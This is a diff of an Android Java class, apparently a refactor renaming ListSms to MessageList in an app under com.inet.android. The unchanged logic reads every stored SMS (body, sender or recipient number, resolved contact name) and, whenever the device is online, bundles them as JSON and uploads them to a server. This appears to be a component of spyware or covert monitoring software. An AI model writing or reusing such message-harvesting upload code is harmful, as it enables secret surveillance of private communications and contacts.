@@ -11,11 +11,11 @@ import android.os.AsyncTask;
 import android.provider.ContactsContract.PhoneLookup;
 
 import com.inet.android.bs.NetworkChangeReceiver;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
 
 /**
  * ListApp class is designed to get the list of sms
@@ -23,24 +23,23 @@ import com.inet.android.utils.ValueWork;
  * @author johny homicide
  * 
  */
-public class ListSms extends AsyncTask<Context, Void, Void> {
+public class MessageList extends AsyncTask<Context, Void, Void> {
 	private Context mContext;
-	private String LOG_TAG = ListSms.class.getSimpleName().toString();
+	private String LOG_TAG = MessageList.class.getSimpleName().toString();
 	private String complete;
 	private int version;
 
 	public void getSmsLogs() {
 		String sendStr = null;
-		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_SMS , mContext);
-		
+		version = AppSettings.getSetting(AppConstants.TYPE_LIST_SMS, mContext);
+
 		// -------------- for---------------------------------------------
 
 		Uri uri = Uri.parse("content://sms");
-		Cursor sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
-				null, "date desc");
+		Cursor sms_sent_cursor = mContext.getContentResolver().query(uri, null,
+				null, null, "date desc");
 		Logging.doLog(LOG_TAG, "readSMS", "readSMS");
-
-		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
+		if (NetworkChangeReceiver.isOnline(mContext) != 0) {
 			complete = "0";
 			// Read the sms data and store it in the list
 			if (sms_sent_cursor != null) {
@@ -54,10 +53,10 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 						int type = -1;
 						switch (typeSms) {
 						case 1:
-							type = ConstantValue.TYPE_INCOMING_SMS_REQUEST;
+							type = AppConstants.TYPE_INCOMING_SMS_REQUEST;
 							break;
 						case 2:
-							type = ConstantValue.TYPE_OUTGOING_SMS_REQUEST;
+							type = AppConstants.TYPE_OUTGOING_SMS_REQUEST;
 							break;
 						default:
 							type = 7;
@@ -77,11 +76,8 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 											.getColumnIndex("body")));
 							archiveSMSJson
 									.put("name",
-											getContactName(
-													mContext,
-													sms_sent_cursor
-															.getString(sms_sent_cursor
-																	.getColumnIndex("address"))));
+											getContactName(sms_sent_cursor.getString(sms_sent_cursor
+													.getColumnIndex("address"))));
 
 							if (sendStr == null)
 								sendStr = archiveSMSJson.toString();
@@ -124,7 +120,8 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void endList() {
-		TurnSendList.setList(ConstantValue.TYPE_LIST_SMS, version, "0", mContext);
+		Queue
+				.setList(AppConstants.TYPE_LIST_SMS, version, "0", mContext);
 	}
 
 	private void lastRaw(String sendStr) {
@@ -134,10 +131,11 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void sendRequest(String str, String complete) {
-		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_SMS_REQUEST, complete, version, mContext);
+		RequestList.sendDemandRequest(str, AppConstants.TYPE_LIST_SMS_REQUEST,
+				complete, version, mContext);
 	}
 
-	private String getContactName(Context context, String phoneNumber) {
+	private String getContactName(String phoneNumber) {
 		ContentResolver cr = mContext.getContentResolver();
 		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI,
 				Uri.encode(phoneNumber));
